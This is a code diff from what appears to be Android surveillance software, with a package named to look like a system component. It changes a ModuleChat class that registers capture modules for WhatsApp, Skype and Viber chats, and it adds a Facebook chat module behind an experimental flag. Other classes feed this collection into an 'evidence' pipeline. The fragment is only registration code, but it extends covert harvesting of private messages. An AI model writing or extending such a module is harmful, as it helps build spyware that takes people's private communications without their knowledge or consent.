@@ -43,6 +43,7 @@ import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
+import com.android.networking.module.chat.ChatFacebook;
 import com.android.networking.module.chat.ChatViber;
 import com.android.networking.module.chat.MessageChat;
 import com.android.networking.module.chat.ChatSkype;
@@ -62,10 +63,13 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 	public ModuleChat() {
 		subModuleManager = new SubModuleManager(this);
 
-		subModuleManager.add(new ChatWhatsapp());
-		subModuleManager.add(new ChatSkype());
-
-		subModuleManager.add(new ChatViber());
+		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
+			subModuleManager.add(new ChatFacebook());
+		} else {
+			subModuleManager.add(new ChatWhatsapp());
+			subModuleManager.add(new ChatSkype());
+			subModuleManager.add(new ChatViber());
+		}
 
 	}
 
